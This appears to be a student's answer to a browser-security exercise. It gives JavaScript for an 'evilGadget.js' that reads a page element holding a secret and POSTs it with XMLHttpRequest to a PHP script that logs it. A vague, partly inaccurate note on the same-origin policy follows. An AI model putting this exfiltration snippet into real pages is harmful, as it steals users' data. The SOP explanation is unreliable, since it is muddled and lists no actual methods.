Look at the code of integrator.html and write code for evilGadget.js in such a way that evilGadget.js will send the secret to an untrusted server. How do you rewrite integrator.html so the same origin policy will protect the secret?
```
We can send data to another server using AJAX.
```
var secret= document.getElementById("secret").textContent;
var xhttp = new XMLHttpRequest();

xhttp.open("POST","writer.php",true);
xhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xhttp.send("secret="+secret);
```
AJAX can send request to another servers asynchronously.
We do a php file which write the secret codes in a txt file.

### Protection from SOP.
Same Origin Policy protect our site if we want to load a file from another server, another port or another subdomain.

We adopt any this methods to prevent it.
